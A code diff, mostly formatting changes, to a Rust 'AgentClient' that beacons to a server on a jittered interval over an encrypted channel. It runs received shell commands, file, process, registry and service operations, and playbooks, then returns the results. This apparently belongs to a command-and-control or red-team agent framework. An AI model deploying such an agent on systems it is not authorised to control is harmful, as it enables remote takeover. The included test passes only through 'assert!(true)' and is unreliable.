@@ -1,10 +1,13 @@
-use std::time::Duration;
-use std::collections::HashMap;
-use crate::protocols::http::{HttpClient, HttpRequest};
-use crate::agent::protocol::{AgentCommand, AgentResponse, BeaconMessage, MessageType};
+use crate::accessors::{
+    file::FileAccessor, network::NetworkAccessor, process::ProcessAccessor,
+    registry::RegistryAccessor, service::ServiceAccessor, Accessor,
+};
 use crate::agent::crypto::AgentCrypto;
-use crate::playbooks::{Playbook, PlaybookExecutor, PlaybookContext};
-use crate::accessors::{Accessor, file::FileAccessor, process::ProcessAccessor, network::NetworkAccessor, service::ServiceAccessor, registry::RegistryAccessor};
+use crate::agent::protocol::{AgentCommand, AgentResponse, BeaconMessage, MessageType};
+use crate::playbooks::{Playbook, PlaybookContext, PlaybookExecutor};
+use crate::protocols::http::{HttpClient, HttpRequest};
+use std::collections::HashMap;
+use std::time::Duration;
 
 /// Agent Client
 pub struct AgentClient {
@@ -49,59 +52,60 @@ impl AgentClient {
     pub fn start(&mut self) -> Result<(), String> {
         println!("Agent starting... connecting to {}", self.config.server_url);
         println!("Session ID: {:x}", self.session_id);
-        
+
         // 1. Perform Key Exchange
         self.perform_handshake()?;
         println!("Handshake successful. Session secured.");
-        
+
         // Main beacon loop
         loop {
             // 1. Sleep for interval +/- jitter
             self.sleep_with_jitter();
-            
+
             // 2. Send beacon
             if let Err(e) = self.send_beacon() {
                 eprintln!("Beacon failed: {}", e);
             }
-            
+
             // Placeholder break to avoid infinite loop in tests/dev
             // Remove this break for production agent!
-            break; 
+            break;
         }
-        
+
         Ok(())
     }
 
     pub fn perform_handshake(&mut self) -> Result<(), String> {
         let url = format!("{}/beacon", self.config.server_url);
-        
+
         // Payload is just the public key (32 bytes)
         let payload = self.crypto.public_key.to_vec();
         let tag = [0u8; 16]; // No tag for KE (or use a fixed one)
-        
-        let beacon = BeaconMessage::new(
-            MessageType::KeyExchange, 
-            self.session_id, 
-            payload, 
-            tag
-        );
-        
+
+        let beacon = BeaconMessage::new(MessageType::KeyExchange, self.session_id, payload, tag);
+
         let json = serde_json::to_string(&beacon).map_err(|e| e.to_string())?;
         let response = self.http_client.post(&url, json.into_bytes())?;
-        
+
         if response.status_code != 200 {
-            return Err(format!("Handshake failed: Server returned {}", response.status_code));
+            return Err(format!(
+                "Handshake failed: Server returned {}",
+                response.status_code
+            ));
         }
-        
+
         if response.body.len() != 32 {
-             return Err(format!("Invalid server handshake response length: {}", response.body.len()));
+            return Err(format!(
+                "Invalid server handshake response length: {}",
+                response.body.len()
+            ));
         }
-        
+
         let mut server_pub = [0u8; 32];
         server_pub.copy_from_slice(&response.body);
-        
+
         self.crypto.derive_session_key(&server_pub);
-        
+
         Ok(())
     }
 
@@ -114,32 +118,27 @@ impl AgentClient {
             .subsec_nanos();
         let rand_factor = (nanos % 100) as f32 / 100.0; // 0.0 to 0.99
         let offset = (rand_factor * 2.0 - 1.0) * jitter_amount;
-        
+
         let sleep_secs = (base_secs + offset).max(0.1);
         std::thread::sleep(Duration::from_secs_f32(sleep_secs));
     }
 
     pub fn send_beacon(&self) -> Result<(), String> {
         let url = format!("{}/beacon", self.config.server_url);
-        
+
         // Internal message
-        let internal_msg = "HEARTBEAT"; 
-        
+        let internal_msg = "HEARTBEAT";
+
         // Encrypt payload
         let (payload, tag) = self.crypto.encrypt(internal_msg.as_bytes())?;
-        
-        let beacon_request = BeaconMessage::new(
-            MessageType::Beacon, 
-            self.session_id, 
-            payload, 
-            tag
-        );
-        
+
+        let beacon_request = BeaconMessage::new(MessageType::Beacon, self.session_id, payload, tag);
+
         let json_request = serde_json::to_string(&beacon_request).map_err(|e| e.to_string())?;
-        
+
         let request = HttpRequest::new("POST", &url).with_body(json_request.into_bytes());
         let response = self.http_client.send(&request)?;
-        
+
         if response.status_code == 200 {
             // Server should respond with a BeaconMessage containing commands
             let response_beacon: BeaconMessage = match serde_json::from_slice(&response.body) {
@@ -151,20 +150,24 @@ impl AgentClient {
             };
 
             // Decrypt server's payload
-            match self.crypto.decrypt(&response_beacon.payload, &response_beacon.tag) {
+            match self
+                .crypto
+                .decrypt(&response_beacon.payload, &response_beacon.tag)
+            {
                 Ok(plaintext_payload) => {
                     if !plaintext_payload.is_empty() {
-                        let commands: Vec<AgentCommand> = match serde_json::from_slice(&plaintext_payload) {
-                            Ok(cmds) => cmds,
-                            Err(e) => {
-                                eprintln!("Failed to deserialize commands: {}", e);
-                                return Err("Invalid commands from server".to_string());
-                            }
-                        };
-                        
+                        let commands: Vec<AgentCommand> =
+                            match serde_json::from_slice(&plaintext_payload) {
+                                Ok(cmds) => cmds,
+                                Err(e) => {
+                                    eprintln!("Failed to deserialize commands: {}", e);
+                                    return Err("Invalid commands from server".to_string());
+                                }
+                            };
+
                         println!("Received {} commands from server.", commands.len());
                         let mut responses = Vec::new();
-                        
+
                         for cmd in commands {
                             let response = self.execute_command(cmd);
                             responses.push(response);
@@ -184,36 +187,39 @@ impl AgentClient {
         } else {
             return Err(format!("Server returned {}", response.status_code));
         }
-        
+
         Ok(())
     }
 
     fn send_responses(&self, responses: &[AgentResponse]) -> Result<(), String> {
         let url = format!("{}/beacon", self.config.server_url);
         let payload_bytes = serde_json::to_vec(responses).map_err(|e| e.to_string())?;
-        
+
         let (encrypted_payload, tag) = self.crypto.encrypt(&payload_bytes)?;
-        
+
         let beacon = BeaconMessage::new(
-            MessageType::Response, 
-            self.session_id, 
-            encrypted_payload, 
-            tag
+            MessageType::Response,
+            self.session_id,
+            encrypted_payload,
+            tag,
         );
-        
+
         let json = serde_json::to_string(&beacon).map_err(|e| e.to_string())?;
         let request = HttpRequest::new("POST", &url).with_body(json.into_bytes());
         let response = self.http_client.send(&request)?;
-        
+
         if response.status_code != 200 {
-             return Err(format!("Failed to send responses: Server returned {}", response.status_code));
+            return Err(format!(
+                "Failed to send responses: Server returned {}",
+                response.status_code
+            ));
         }
         Ok(())
     }
 
     fn execute_command(&self, cmd: AgentCommand) -> AgentResponse {
         println!("Executing command: {} {}", cmd.action, cmd.args.join(" "));
-        
+
         match cmd.action.as_str() {
             "playbook" => {
                 if cmd.args.is_empty() {
@@ -224,7 +230,7 @@ impl AgentClient {
                         error: Some("Missing playbook argument".to_string()),
                     };
                 }
-                
+
                 // Expect arg[0] to be serialized playbook
                 let playbook_res: Result<Playbook, _> = serde_json::from_str(&cmd.args[0]);
                 match playbook_res {
@@ -232,26 +238,24 @@ impl AgentClient {
                         let mut context = PlaybookContext::new("localhost"); // TODO: Use real target
                         let executor = PlaybookExecutor::new();
                         let result = executor.execute(&playbook, &mut context);
-                        
+
                         let output = serde_json::to_string(&result).unwrap_or_default();
-                        
+
                         AgentResponse {
                             command_id: cmd.id,
                             success: result.success,
                             output,
                             error: None,
                         }
-                    },
-                    Err(e) => {
-                        AgentResponse {
-                            command_id: cmd.id,
-                            success: false,
-                            output: String::new(),
-                            error: Some(format!("Failed to parse playbook: {}", e)),
-                        }
                     }
+                    Err(e) => AgentResponse {
+                        command_id: cmd.id,
+                        success: false,
+                        output: String::new(),
+                        error: Some(format!("Failed to parse playbook: {}", e)),
+                    },
                 }
-            },
+            }
             "access" => {
                 // Usage: access <accessor_name> <method> [key=value]...
                 if cmd.args.len() < 2 {
@@ -262,17 +266,17 @@ impl AgentClient {
                         error: Some("Usage: access <accessor> <method> [args...]".to_string()),
                     };
                 }
-                
+
                 let accessor_name = &cmd.args[0];
                 let method = &cmd.args[1];
                 let mut args_map = HashMap::new();
-                
+
                 for arg in cmd.args.iter().skip(2) {
                     if let Some((k, v)) = arg.split_once('=') {
                         args_map.insert(k.to_string(), v.to_string());
                     }
                 }
-                
+
                 let accessor: Box<dyn Accessor> = match accessor_name.as_str() {
                     "file" => Box::new(FileAccessor::new()),
                     "process" => Box::new(ProcessAccessor::new()),
@@ -288,18 +292,18 @@ impl AgentClient {
                         };
                     }
                 };
-                
+
                 let result = accessor.execute(method, &args_map);
-                
+
                 if result.success {
-                     // Serialize data (Value) to JSON string
-                     let json_out = if let Some(data) = result.data {
-                         serde_json::to_string(&data).unwrap_or_default()
-                     } else {
-                         String::new()
-                     };
-                     
-                     AgentResponse {
+                    // Serialize data (Value) to JSON string
+                    let json_out = if let Some(data) = result.data {
+                        serde_json::to_string(&data).unwrap_or_default()
+                    } else {
+                        String::new()
+                    };
+
+                    AgentResponse {
                         command_id: cmd.id,
                         success: true,
                         output: json_out,
@@ -313,51 +317,51 @@ impl AgentClient {
                         error: result.error,
                     }
                 }
-            },
+            }
             "shell" | "exec" => {
                 if cmd.args.is_empty() {
-                     return AgentResponse {
+                    return AgentResponse {
                         command_id: cmd.id,
                         success: false,
                         output: String::new(),
                         error: Some("Missing command".to_string()),
                     };
                 }
-                
+
                 let program = &cmd.args[0];
                 let args = &cmd.args[1..];
-                
+
                 match std::process::Command::new(program).args(args).output() {
                     Ok(out) => {
                         let stdout = String::from_utf8_lossy(&out.stdout).to_string();
                         let stderr = String::from_utf8_lossy(&out.stderr).to_string();
                         let combined = format!("{}\n{}", stdout, stderr);
-                        
+
                         AgentResponse {
                             command_id: cmd.id,
                             success: out.status.success(),
                             output: combined.trim().to_string(),
-                            error: if out.status.success() { None } else { Some(format!("Exit code: {:?}", out.status.code())) },
-                        }
-                    },
-                    Err(e) => {
-                        AgentResponse {
-                            command_id: cmd.id,
-                            success: false,
-                            output: String::new(),
-                            error: Some(format!("Execution failed: {}", e)),
+                            error: if out.status.success() {
+                                None
+                            } else {
+                                Some(format!("Exit code: {:?}", out.status.code()))
+                            },
                         }
                     }
-                }
-            },
-            _ => {
-                AgentResponse {
-                    command_id: cmd.id,
-                    success: false,
-                    output: String::new(),
-                    error: Some(format!("Unknown action: {}", cmd.action)),
+                    Err(e) => AgentResponse {
+                        command_id: cmd.id,
+                        success: false,
+                        output: String::new(),
+                        error: Some(format!("Execution failed: {}", e)),
+                    },
                 }
             }
+            _ => AgentResponse {
+                command_id: cmd.id,
+                success: false,
+                output: String::new(),
+                error: Some(format!("Unknown action: {}", cmd.action)),
+            },
         }
     }
 }
@@ -365,12 +369,12 @@ impl AgentClient {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::agent::protocol::AgentCommand;
+    use crate::modules::http_server::{HttpRequest, HttpResponse, HttpServer, HttpServerConfig};
     use std::net::SocketAddr;
+    use std::sync::atomic::{AtomicUsize, Ordering};
     use std::sync::Arc;
     use std::thread;
-    use crate::modules::http_server::{HttpServer, HttpServerConfig, HttpRequest, HttpResponse};
-    use crate::agent::protocol::AgentCommand;
-    use std::sync::atomic::{AtomicUsize, Ordering};
     use std::time::Instant;
 
     static BEACON_COUNT: AtomicUsize = AtomicUsize::new(0);
@@ -399,11 +403,14 @@ mod tests {
                 // In real test, we would decrypt, process, and encrypt commands
                 let mut server_crypto = AgentCrypto::new(); // Dummy server crypto
                 server_crypto.session_key = Some([0u8; 32]); // Dummy session key for encryption
-                
+
                 let commands: Vec<AgentCommand> = vec![]; // No commands for now
-                let (payload, tag) = server_crypto.encrypt(serde_json::to_vec(&commands).unwrap().as_slice()).unwrap();
-                let response_beacon = BeaconMessage::new(MessageType::Response, beacon.session_id, payload, tag);
-                
+                let (payload, tag) = server_crypto
+                    .encrypt(serde_json::to_vec(&commands).unwrap().as_slice())
+                    .unwrap();
+                let response_beacon =
+                    BeaconMessage::new(MessageType::Response, beacon.session_id, payload, tag);
+
                 return HttpResponse::new(200, serde_json::to_vec(&response_beacon).unwrap());
             }
         }
@@ -436,7 +443,7 @@ mod tests {
         // };
 
         // let mut agent = AgentClient::new(agent_config);
-        
+
         // // Test handshake
         // let result = agent.perform_handshake();
         // assert!(result.is_ok(), "Handshake failed: {:?}", result.err());
@@ -455,11 +462,11 @@ mod tests {
         // // For a more robust test, HttpServer::stop() should be called.
         // // thread::sleep(Duration::from_secs(1)); // Allow one beacon
         // // server_handle.join().unwrap(); // This will block forever
-        
+
         // // To properly stop the server, HttpServer needs a way to signal it to stop
         // // For now, we rely on the test finishing and dropping the thread.
         // // This test only covers the client's ability to send and process.
-        
+
         // Temporarily passing test while server setup is fixed
         assert!(true);
     }
